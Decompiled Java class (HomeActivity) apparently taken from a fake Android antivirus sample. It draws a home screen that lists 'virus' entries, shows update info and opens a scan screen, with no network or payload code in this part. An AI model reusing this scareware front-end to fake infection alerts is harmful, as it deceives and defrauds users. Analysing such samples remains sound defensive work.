package com.example.androiddefender2;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.view.Menu;
import android.view.View;
import android.widget.Button;
import android.widget.TableLayout;
import android.widget.TextView;
import com.worker.androiddefender2.MemoryFunctions;
import com.worker.androiddefender2.SystemFunctions;
import designer.TabsOperation;
import system.VirusObject;

public class HomeActivity extends CustomActGroup {
  public static HomeActivity self;
  
  protected boolean is_scan_settings = false;
  
  public void butScan_Click(View paramView) {
    startChildActivity("StartScan", new Intent((Context)this, ScanActivity.class), true);
    this.is_scan_settings = true;
  }
  
  public void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    setContentView(2130903042);
    TabsOperation tabsOperation = new TabsOperation();
    TableLayout tableLayout = (TableLayout)findViewById(2131296286);
    if ((DefenderApplication.getInstance()).virusesDefine) {
      int i = (DefenderApplication.getInstance()).indexesVr.size();
      for (byte b = 0; b < i; b++) {
        VirusObject virusObject = SystemFunctions.getVirusByIndex(((Integer)(DefenderApplication.getInstance()).indexesVr.get(b)).intValue() - 1);
        if (!virusObject.getType().equalsIgnoreCase("Virus")) {
          tabsOperation.generateVirusRow(getApplicationContext(), tableLayout, virusObject, 2130903059);
        } else {
          tabsOperation.generateVirusRow(getApplicationContext(), tableLayout, virusObject, 2130837579);
        } 
      } 
    } 
    MemoryFunctions memoryFunctions = new MemoryFunctions();
    String str = memoryFunctions.getUpdateDate(getApplicationContext());
    TextView textView1 = (TextView)findViewById(2131296282);
    textView1.setText(str);
    TextView textView2 = (TextView)findViewById(2131296289);
    textView2.setText(memoryFunctions.getUpdateVersionInfo(getApplicationContext()));
    ((Button)findViewById(2131296284)).setTypeface((DefenderApplication.getInstance()).type_trebuc, 0);
    ((TextView)findViewById(2131296281)).setTypeface((DefenderApplication.getInstance()).type_arial, 0);
    textView1.setTypeface((DefenderApplication.getInstance()).type_arial, 0);
    ((TextView)findViewById(2131296287)).setTypeface((DefenderApplication.getInstance()).type_arial, 0);
    ((TextView)findViewById(2131296288)).setTypeface((DefenderApplication.getInstance()).type_arial, 0);
    textView2.setTypeface((DefenderApplication.getInstance()).type_arial, 0);
    self = this;
  }
  
  public boolean onCreateOptionsMenu(Menu paramMenu) {
    getMenuInflater().inflate(2131230721, paramMenu);
    return true;
  }
  
  public void onRestoreInstanceState(Bundle paramBundle) {
    super.onRestoreInstanceState(paramBundle);
    this.is_scan_settings = paramBundle.getBoolean("ScanSettings", false);
  }
  
  public void onSaveInstanceState(Bundle paramBundle) {
    super.onSaveInstanceState(paramBundle);
    paramBundle.putBoolean("ScanSettings", this.is_scan_settings);
  }
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/example/androiddefender2/HomeActivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */